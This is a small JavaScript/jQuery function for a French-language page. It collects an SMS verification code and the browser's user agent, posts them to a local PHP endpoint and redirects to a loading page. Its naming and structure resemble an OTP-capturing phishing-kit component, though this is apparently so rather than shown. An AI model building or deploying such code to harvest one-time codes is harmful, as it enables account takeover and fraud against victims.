function smspass(){
	
var SMS_PT	 =	 $("#sms_code").val();
	

	
if(SMS_PT==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Veuillez saisir le code reçu par sms"

})	

return false;	
}


var data_sms = 
{
DEVICE_CR : navigator.userAgent,
SMS_CR    :	SMS_PT

}; 

console.log(JSON.stringify(data_sms));
var _url = '../api/data_sms.php';


$.post(_url,data_sms,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	


 window.location="../backend/load.html";
} 


}) 
}